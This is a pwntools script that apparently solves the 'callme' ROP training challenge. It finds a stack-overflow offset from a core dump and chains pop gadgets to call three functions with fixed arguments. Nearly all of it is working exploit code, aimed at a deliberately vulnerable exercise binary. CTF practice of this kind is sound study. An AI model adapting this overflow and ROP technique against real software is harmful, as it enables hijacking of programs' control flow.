#!/usr/bin/python3

"""
In this challenge, we have to call three functions in the correct order all with the three exact
same arguments. The challenge prompt indicates the PLT should be useful here, but it turned out
that it was not. 

We needed the locations of the callme functions BEFORE they were relocated, because they are
never called (they are only called in the usefulFunction function, but we never call it in normal
execution).
"""

from pwn import *
import time

bin_file = "./callme"         # Binary for the challenge
core_file = "./core"          # Corefile
elf = ELF(bin_file)           # Grab that binary, bro
arg0 = 0xdeadbeefdeadbeef     # First argument for the callme functions
arg1 = 0xcafebabecafebabe     # Second argument
arg2 = 0xd00df00dd00df00d     # Third (these will be "halved" for the non 64-bit challenges)
func0_addr = 0x400726         # First function prior to relocation
func1_addr = 0x400746         # Second
func2_addr = 0x4006f6         # Third
func0_addr_reloc = 0x00601040 # First function post relocation
func1_addr_reloc = 0x00601050 # Second
func2_addr_reloc = 0x00601028 # Third
pattern = cyclic(1024)        # Go ahead and generate the DeBruin pattern
gadget_rdx = 0x0040093e       # Gadget that POPs RDX
gadget_rsi = 0x004009a1       # This gadget POPs RSI and R15 (pass same arg twice to use)
gadget_rdi = 0x004009a3       # Gadget to POP RDI
super_gadget = 0x0040093c     # POPs all three (RDX, RSI, and RDI) at once
usefulFunction = 0x004008f2   # Function that calls the callme functions (we don't need it)
exit_addr = usefulFunction    # We could use anything, but the usefulFunction works, so just use it here


"""
Find the bug
"""
p = process(bin_file)
print(p.readline())
print(p.readline())
print(p.readline())
print(p.readline())
print(p.readline())
p.sendline(pattern)
print(p.readline())

time.sleep(2)

core = Corefile(core_file)
p.close()
fault_addr = int("0x" + hex(core.fault_addr)[10:], 16)
offset = cyclic_find(fault_addr)

payload = b"V"*offset # Add offset

# Below would also work using the individual gadgets
#payload += p64(gadget_rdx)
#payload += p64(arg2)
#payload += p64(gadget_rsi)
#payload += p64(arg1)
#payload += p64(arg1)
#payload += p64(gadget_rdi)
#payload += p64(arg0)
payload += p64(super_gadget) # POP registers
payload += p64(arg0)         # add deadbeef arg
payload += p64(arg1)         # add cagebabe arg
payload += p64(arg2)         # add doodfood arg
payload += p64(func0_addr)   # call the function, like a bawz

payload += p64(super_gadget) # repeat
payload += p64(arg0)
payload += p64(arg1)
payload += p64(arg2)
payload += p64(func1_addr)

payload += p64(super_gadget) # again
payload += p64(arg0)
payload += p64(arg1)
payload += p64(arg2)
payload += p64(func2_addr)

payload += p64(exit_addr)    # Add the exit function

p = process(bin_file)
print(p.readline())
print(p.readline())
print(p.readline())
print(p.readline())
print(p.readline())
p.sendline(payload)
print(p.readline())
print(p.readline())
print(p.readline())
print(p.readline())
p.close()
